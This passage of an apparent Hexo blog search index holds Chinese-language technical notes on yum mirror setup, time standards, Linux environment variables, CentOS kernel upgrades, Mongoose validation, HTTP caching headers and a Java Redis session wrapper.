class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-5.repo</span><br></pre></td></tr></table></figure><p>CentOS 6</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo</span><br></pre></td></tr></table></figure><p>CentOS 7</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br></pre></td></tr></table></figure><p>3、之后运行 yum makecache 生成缓存</p><h3 id="操作硬件平台"><a href="#操作硬件平台" class="headerlink" title="操作硬件平台"></a>操作硬件平台</h3><p><img src="/images/WX20200214-095055@2x.png" alt="操作硬件平台"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://linux.vbird.org/linux_basic/0520rpm_and_srpm.php#yumclient">【1】</a></li><li><a href="http://man.linuxde.net/yum">【2】</a></li><li><a href="http://cn.linux.vbird.org/linux_basic/0520rpm_and_srpm.php">软件安装： RPM, SRPM 与 YUM 功能</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>时间系统</title>
      <link href="/post/date-time.html"/>
      <url>/post/date-time.html</url>
      
        <content type="html"><![CDATA[<h2 id="时间系统"><a href="#时间系统" class="headerlink" title="时间系统"></a>时间系统</h2><h3 id="GMT"><a href="#GMT" class="headerlink" title="GMT"></a>GMT</h3><p>格林威治标准时间。格林尼治平时的正午是指当平太阳横穿格林威治子午线时（也就是在格林威治上空最高点时）的时间。由于地球每天的自转是有些不规则的，而且正在缓慢减速，因此格林威治平时基于天文观测本身的缺陷，已经被原子钟报时的协调世界时（UTC）所取代。自1924年2月5日开始，格林威治天文台负责每隔一小时向全世界发放调时信息。</p><h3 id="UT"><a href="#UT" class="headerlink" title="UT"></a>UT</h3><p>世界时。世界时（Universal Time，简称UT）是一种以格林尼治子夜起算的平太阳时。世界时是以地球自转为基准得到的时间尺度，其精度受到地球自转不均匀变化和极移的影响，为了解决这种影响，1955年国际天文联合会定义了<strong>UT0</strong>、<strong>UT1</strong>和<strong>UT2</strong>三个系统：</p><ul><li><p>UT0系统是由一个天文台的天文观测直接测定的世界时，没有考虑极移造成的天文台地理坐标变化。该系统曾长期被认为是稳定均匀的时间计量系统，得到过广泛应用。它又叫格林尼治平时(GMT)。</p></li><li><p>UT1系统是在UT0的基础上加入了极移改正 Δλ，修正地轴摆动的影响。UT1是目前使用的世界时标准。被作为目前世界民用时间标准UTC在增减闰秒时的参照标准。</p></li><li><p>UT2系统是UT1的平滑处理版本，在UT1基础上加入了地球自转速率的季节性改正 ΔT。</p></li></ul><h3 id="UTC"><a href="#UTC" class="headerlink" title="UTC"></a>UTC</h3><p>协调世界时。UTC基于国际原子时，并通过不规则的加入闰秒来抵消地球自转变慢的影响。闰秒在必要的时候会被插入到UTC中，以保证协调世界时（UTC）与世界时（UT1）相差不超过0.9秒。UTC被应用于许多互联网和万维网的标准中，例如，网络时间协议（NTP, Network Time Protocol）就是协调世界时在互联网中使用的一种方式。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&#x27;2018-07-17T22:58:23Z&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&#x27;2018-07-17T22:58:23+0800&#x27;</span>);</span><br></pre></td></tr></table></figure><p>上例中第一个时间表示UTC时间，第二个表示北京时间。第二个时间比第一个早了八个小时。</p><h3 id="CST"><a href="#CST" class="headerlink" title="CST"></a>CST</h3><p><strong>C</strong>hina <strong>S</strong>tandard <strong>T</strong>ime 中国标准时间，是中国大陆的标准时间，比世界协调时快八小时（即UTC+8）。</p><blockquote><p>注意CST还有其它含义：</p><ul><li>澳洲中部时间，Central Standard Time (Australia)</li><li>北美中部时区，Central Standard Time (North America)</li><li>古巴标准时间，Cuba Standard Time，参见北美东部时区</li></ul></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://www.ecma-international.org/ecma-262/5.1/#sec-15.9.1.15">Date Time String Format</a></li><li><a href="https://www.wikiwand.com/zh/%E5%8D%8F%E8%B0%83%E4%B8%96%E7%95%8C%E6%97%B6">协调世界时</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> date </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>环境变量</title>
      <link href="/post/environment-variable.html"/>
      <url>/post/environment-variable.html</url>
      
        <content type="html"><![CDATA[<h3 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export name=value</span><br></pre></td></tr></table></figure><h3 id="查看进程环境变量"><a href="#查看进程环境变量" class="headerlink" title="查看进程环境变量"></a>查看进程环境变量</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看某个进程的环境变量</span></span><br><span class="line">cat /proc/$PID/environ</span><br></pre></td></tr></table></figure><p>每一个环境变量以name&#x3D;value形式来描述，彼此间有null字符(\0)分割。</p><p>将\0替换成\n输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看某个进程的环境变量</span></span><br><span class="line">cat /proc/$PID/environ | tr &#x27;\0&#x27; &#x27;\n&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux错误重定向</title>
      <link href="/post/linux-redirect-standard-error.html"/>
      <url>/post/linux-redirect-standard-error.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svn cleanup /Users/doog/Documents/Workspaces/work/innovation &gt;&gt; /Users/doog/log 2&gt;&amp;1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Mac不能清空废纸篓</title>
      <link href="/post/macos-clean-trash.html"/>
      <url>/post/macos-clean-trash.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf ~/.Trash/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mongoose-validation</title>
      <link href="/post/mongoose-validation.html"/>
      <url>/post/mongoose-validation.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://mongoosejs.com/docs/validation.html">http://mongoosejs.com/docs/validation.html</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> schema = <span class="keyword">new</span> <span class="title class_">Schema</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">required</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Cat</span> = db.<span class="title function_">model</span>(<span class="string">&#x27;Cat&#x27;</span>, schema);</span><br><span class="line"></span><br><span class="line"><span class="comment">// This cat has no name :(</span></span><br><span class="line"><span class="keyword">var</span> cat = <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">cat.<span class="title function_">save</span>(<span class="keyword">function</span>(<span class="params">error</span>) &#123;</span><br><span class="line">  assert.<span class="title function_">equal</span>(error.<span class="property">errors</span>[<span class="string">&#x27;name&#x27;</span>].<span class="property">message</span>,</span><br><span class="line">    <span class="string">&#x27;Path `name` is required.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  error = cat.<span class="title function_">validateSync</span>();</span><br><span class="line">  assert.<span class="title function_">equal</span>(error.<span class="property">errors</span>[<span class="string">&#x27;name&#x27;</span>].<span class="property">message</span>,</span><br><span class="line">    <span class="string">&#x27;Path `name` is required.&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a href="http://cnodejs.org/topic/504b4924e2b84515770103dd">http://cnodejs.org/topic/504b4924e2b84515770103dd</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">PersonSchema</span> = <span class="keyword">new</span> <span class="title class_">Schema</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>:&#123;</span><br><span class="line">    <span class="attr">type</span>:<span class="string">&#x27;String&#x27;</span>,</span><br><span class="line">    <span class="attr">required</span>:<span class="literal">true</span> <span class="comment">//姓名非空</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">age</span>:&#123;</span><br><span class="line">    <span class="attr">type</span>:<span class="string">&#x27;Nunmer&#x27;</span>,</span><br><span class="line">    <span class="attr">min</span>:<span class="number">18</span>,       <span class="comment">//年龄最小18</span></span><br><span class="line">    <span class="attr">max</span>:<span class="number">120</span>     <span class="comment">//年龄最大120</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">city</span>:&#123;</span><br><span class="line">    <span class="attr">type</span>:<span class="string">&#x27;String&#x27;</span>,</span><br><span class="line">    <span class="attr">enum</span>:[<span class="string">&#x27;北京&#x27;</span>,<span class="string">&#x27;上海&#x27;</span>]  <span class="comment">//只能是北京、上海人</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">other</span>:&#123;</span><br><span class="line">    <span class="attr">type</span>:<span class="string">&#x27;String&#x27;</span>,</span><br><span class="line">    <span class="attr">validate</span>:[validator,err]  <span class="comment">//validator是一个验证函数，err是验证失败的错误信息</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核</title>
      <link href="/post/linux-kernel.html"/>
      <url>/post/linux-kernel.html</url>
      
        <content type="html"><![CDATA[<h2 id="Linux内核"><a href="#Linux内核" class="headerlink" title="Linux内核"></a>Linux内核</h2><h3 id="查看内核及发行版"><a href="#查看内核及发行版" class="headerlink" title="查看内核及发行版"></a>查看内核及发行版</h3><ol><li><code>uname -a</code>：查看Linux内核版本</li><li><code>cat /etc/issue</code>：查看发行版</li><li><code>cat /proc/version</code></li></ol><h3 id="升级CentOS6内核"><a href="#升级CentOS6内核" class="headerlink" title="升级CentOS6内核"></a>升级CentOS6内核</h3><ol><li><p>导入public key</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org</span><br></pre></td></tr></table></figure></li><li><p>添加ELRepo</p><ul><li>RHEL-7, SL-7 or CentOS-7：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-3.el7.elrepo.noarch.rpm</span><br></pre></td></tr></table></figure></li><li>RHEL-6, SL-6 or CentOS-6： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -Uvh http://www.elrepo.org/elrepo-release-6-8.el6.elrepo.noarch.rpm</span><br></pre></td></tr></table></figure></li></ul></li><li><p>升级Kernel</p><blockquote><p>在 ELRepo 中有两个内核选项，一个是 kernel-lt(长期支持版本)，一个是 kernel-ml(主线最新版本)，采用长期支持版本(kernel-lt)。</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># kernel-lt</span><br><span class="line">yum --enablerepo=elrepo-kernel install kernel-lt -y </span><br><span class="line">or</span><br><span class="line"># kernel-ml</span><br><span class="line">yum --enablerepo=elrepo-kernel install kernel-ml -y </span><br></pre></td></tr></table></figure></blockquote></li><li><p>安装完成，需要修改grub</p><blockquote><p>根据安装好以后的内核位置，修改 default 的值，一般是修改为0，因为 default 从 0 开始，一般新安装的内核在第一个位置，所以设置default&#x3D;0。</p></blockquote><ul><li>RHEL-7, SL-7 or CentOS-7：</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/default/grub</span><br><span class="line"></span><br><span class="line"># 重新编译内核启动文件</span><br><span class="line">grub2-mkconfig -o /boot/grub2/grub.cfg</span><br></pre></td></tr></table></figure><ul><li>RHEL-6, SL-6 or CentOS-6：</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/grub.conf</span><br></pre></td></tr></table></figure></li><li><p>删除旧内核</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep kernel</span><br><span class="line">yum autoremove kernel-2.6.32-696.el6.x86_64</span><br></pre></td></tr></table></figure></li><li><p>重启服务器</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot </span><br></pre></td></tr></table></figure></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://blog.csdn.net/wh211212/article/details/78683753">CentOS6.X 升级内核Kernel</a></li><li><a href="http://elrepo.org/tiki/tiki-index.php">ELRepo.org</a></li><li><a href="https://www.centos.bz/2017/08/upgrade-centos-7-6-kernel-to-4-12-4/">升级Centos 7&#x2F;6内核版本到4.12.4的方法</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP缓存.md</title>
      <link href="/post/http-cache.html"/>
      <url>/post/http-cache.html</url>
      
        <content type="html"><![CDATA[<h3 id="Http-Cache"><a href="#Http-Cache" class="headerlink" title="Http Cache"></a>Http Cache</h3><p>http缓存主要有两个地方，浏览器和缓存服务器。<br><img src="/images/QQ20160906-0@2x.jpg"></p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>Age</td><td>Age 能告知客户端,源服务器在多久前创建了响应。字段 值的单位为秒。表示缓存服务器拿缓存了多久。</td></tr><tr><td>Date</td><td>Date 表明创建 HTTP 报文的日期和时间。</td></tr><tr><td>Cache-Control:max-age</td><td>定义了文档的最大使用期——从第一次生成文档到文档不再新鲜、无法使用为止,最大的合法生存时间(以秒为单位) Cache-Control: max-age&#x3D;484200</td></tr><tr><td>Expires</td><td>指定一个绝对的过期日期。如果过期日期已经过了,就说明文档不再新鲜了 Expires: Fri, 05 Jul 2002, 05:00:00 GMT。如果是缓存服务器，缓存服务器在这段时间内不会再去请求源服务器。Expires是HTTP&#x2F;1.0的写法，HTTP&#x2F;1.1使用Cache-Control:max-age。</td></tr><tr><td>Pragma</td><td>Pragma 是 HTTP&#x2F;1.1 之前版本的历史遗留字段。 Cache-Control: no-cache和  Pragma: no-cache含义一样。</td></tr><tr><td>Last-Modified</td><td>资源的最新修改时间，和If-Modified-Since是一对。</td></tr><tr><td>If-Modified-Since:date</td><td>客户端再次发送请求时会带上响应时Last-Modified的值，服务端会根据日期去比对资源是否是旧的。</td></tr><tr><td>ETag</td><td>它是一种可将资源以字符串形式做唯一性标识的方式。服务器会为每份资源分配对应的 ETag 值。客户端再发请求时会在If-None-Match带上ETag的值，服务器端回去比对是否一致，如果一致则响应304，不再发送响应体。</td></tr><tr><td>If-None-Match:tags</td><td>和Etag是一对</td></tr></tbody></table><h3 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h3><blockquote><p>Expires 首部和 Cache-Control: max-age 首部所做的事情本质上是一样的,但由于 Cache-Control 首部使用的是相对时间而不是绝对日期,所以我们更倾向于使用比较新的 Cache-Control 首部。绝对日期依赖于计算机时钟的正确设置。</p></blockquote><hr><blockquote><p>仅仅是已缓存文档过期了并不意味着它和原始服务器上目前处于活跃状态的文档有实际的区别;这只是意味着到了要进行核对的时间了。这种情况被称为“服务器再 验证”,说明缓存需要询问原始服务器文档是否发生了变化。</p><ul><li>如果再验证显示内容发生了变化,缓存会获取一份新的文档副本,并将其存储在旧文档的位置上,然后将文档发送给客户端。</li><li>如果再验证显示内容没有发生变化,缓存只需要获取新的首部,包括一个新的过期日期,并对缓存中的首部进行更新就行了。</li></ul></blockquote><hr><blockquote><p>If-Modified-Since 首部可以与 Last-Modified 服务器响应首部配合工作。原始 服务器会将最后的修改日期附加到所提供的文档上去。当缓存要对已缓存文档进行 再验证时,就会包含一个 If-Modified-Since 首部,其中携带有最后修改已缓存副 本的日期:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If-Modified-Since: &lt;cached last-modified date&gt;</span><br></pre></td></tr></table></figure><h3 id="浏览器缓存再验证"><a href="#浏览器缓存再验证" class="headerlink" title="浏览器缓存再验证"></a>浏览器缓存再验证</h3><ol><li><p>检查本地有没有缓存。如果没有直接发出请求，如果有则检查缓存是否过期。</p></li><li><p>服务器用 HTTP&#x2F;1.0+ 的 Expires 首部或 HTTP&#x2F;1.1 的 Cache-Control: max-age 响应首部来指定过期日期。如果响应中没有 Cache-Control: max-age 首部，也没有 Expires 首部，缓存可以计算出一个<code>试探性最大使用期</code>。LM-Factor 算法是一种很常用的试探性过期算法，算法的逻辑如下所示。</p><ul><li>如果已缓存文档最后一次修改发生在很久以前，它可能会是一份稳定的文档，不 太会突然发生变化，因此将其继续保存在缓存中会比较安全。</li><li>如果已缓存文挡最近被修改过，就说明它很可能会频繁地发生变化，因此在与服 务器进行再验证之前，只应该将其缓存很短一段时间。<br> <a href="https://tools.ietf.org/html/rfc2616#section-13.2.2"><img src="/images/QQ20170505-140727@2x.jpg"></a><blockquote><p>这个 <code>试探性最大使用期</code> 的值和文档修改日期有关，也就是响应头中的 <code>Last-Modified</code> 首部。如果 <code>Last-Modified</code> 日期距今比较久，就会算出来一个比较长的 <code>试探性最大使用期</code> 。</p></blockquote></li></ul></li><li><p>如果缓存没有过期，直接使用缓存，不再发出请求。如果仅仅是已缓存文档过期了并不意味着它和原始服务器上目前处于活跃状态的文档有实际的区别，这只是意味着到了要进行核对的时间了。这种情况被称为<code>服务器再验证</code>，说明缓存需要询问原始服务器文档是否发生了变化。最常见的缓存再验证首部是 If-Modified-Since 和 If-None-Match 。If-Modified-Since 与 Last-Modified 服务器响应首部配合工作，If-None-Match 与 ETag 服务器响应首部配合工作。如果服务器验证文档没被修改过，条件就为假，会向客户端返回一个小的 304 Not Modified 响应报文，为了提高有效性，不会返回文档的主体。如果文档呗修改了，服务器会在一个 200 OK 响应中返回新的内容以及相应的新 Last-Modified 和 Etag。</p></li></ol><blockquote><p>正常情况下服务器都应该明确指定过期时间，如果没有提供过期时间并且提供了 Last-Modified time 浏览器就会给我们算出来一个过期时间。这个时间是隐式的，再次发出请求时浏览器回去根据这个 <code>试探性最大使用期</code> 检查文档是否过期。如果没有过期，就不会再进行 revalidated ，我们也就不会看到发出请求响应 304 的情况（304 是进行在验证的结果）。如果我们希望浏览器都回去服务器进行 revalidated，可以设置响应头 <code>Cache-Control: max-age=0</code>。</p></blockquote><p><a href="https://tools.ietf.org/html/rfc2616#section-13.2.6"><img src="/images/QQ20170505-142938@2x.jpg"></a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>《HTTP权威指南》 《图解HTTP》</p><p><a href="https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn">Google developers HTTP 缓存</a><br><a href="https://tools.ietf.org/html/rfc2616#section-13.2.2">Heuristic Expiration</a><br><a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html#sec13.2.6">revalidate cache use Cache-Control</a><br><a href="https://jakearchibald.com/2016/caching-best-practices/">Caching best practices</a><br><a href="http://www.alloyteam.com/2016/03/discussion-on-web-caching/">浅谈Web缓存</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> cache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-redis-session.md</title>
      <link href="/post/java-redis-session.html"/>
      <url>/post/java-redis-session.html</url>
      
        <content type="html"><![CDATA[<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>很多时候服务器需要用集群的方式进行部署，这种情况有有一个问题需要解决，那就是Session。根据Java EE规范，HttpSession默认是由各个厂商自己来实现的。例如Tomcat默认的HttpSession就是用用Map来实现的。这种默认的实现在集群环境中有很大的问题，无法实现Session共享。这种应用内Session有个很大的问题是Session太多时会占用太多的堆内存，合理的思路是应该找专业的第三方缓存来存放Session。<br>很多应用现在都在使用Redis或者Memcache来做缓存，我们也可以把Session放到这种专业缓存中。</p><p>如何放进去？这是个问题。</p><p>有一个类叫做<code>HttpServletRequestWrapper</code>，一看这个名字就知道它使用的是装饰器模式。我们可以从这里入手来用第三方缓存来存储Session。我们通过拦截器来把包装原来的<code>HttpServletRequest</code>和<code>HttpServletResponse</code>实现。<br><img src="/images/QQ20160829-0@2x.jpg"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    request = <span class="keyword">new</span> <span class="title class_">HttpServletRedisRequest</span>((HttpServletRequest) request);</span><br><span class="line">    response = <span class="keyword">new</span> <span class="title class_">HttpServletRedisResponse</span>((HttpServletResponse) response, (HttpServletRequest) request);</span><br><span class="line"></span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们可以在Filter中的<code>init</code>方法中初始化Redis连接池，在<code>destroy</code>方法中销毁连接</p></blockquote><p>在<code>HttpServletRedisRequest</code>里面我们重写getSession方法，替换成自己的Session实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpServletRedisRequest</span> <span class="keyword">extends</span> <span class="title class_">HttpServletRequestWrapper</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> HttpServletRequest request;</span><br><span class="line">    <span class="keyword">private</span> String sid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructs a request object wrapping the given request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException if the request is null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HttpServletRedisRequest</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(request);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.request = request;</span><br><span class="line">        <span class="built_in">this</span>.sid = request.getHeader(TOKEN_HEADER_NAME);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> HttpSession <span class="title function_">getSession</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getSession(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> HttpSession <span class="title function_">getSession</span><span class="params">(<span class="type">boolean</span> create)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (sid != <span class="literal">null</span> &amp;&amp; sid.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> sessionManage.get(sid, <span class="built_in">this</span>.getServletContext());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (create) &#123;</span><br><span class="line">            <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> sessionManage.newSession(<span class="built_in">this</span>.getServletContext());</span><br><span class="line">            <span class="built_in">this</span>.sid = session.getId();</span><br><span class="line">            <span class="keyword">return</span> session;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getRequestedSessionId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.sid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAttribute</span><span class="params">(String name, Object o)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.setAttribute(name, o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在<code>HttpServletRedisResponse</code>中，把SessionID放到响应头或者Cookie中响应给浏览器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpServletRedisResponse</span> <span class="keyword">extends</span> <span class="title class_">HttpServletResponseWrapper</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> HttpServletRequest request;    </span><br><span class="line">    <span class="keyword">private</span> HttpServletResponse response;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HttpServletRedisResponse</span><span class="params">(HttpServletResponse response, HttpServletRequest request)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(response);</span><br><span class="line">       <span class="built_in">this</span>.request = request;</span><br><span class="line">       <span class="built_in">this</span>.response = response;</span><br><span class="line"></span><br><span class="line">       response.setHeader(TOKEN_HEADER_NAME, request.getRequestedSessionId());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="装饰器模式详解"><a href="#装饰器模式详解" class="headerlink" 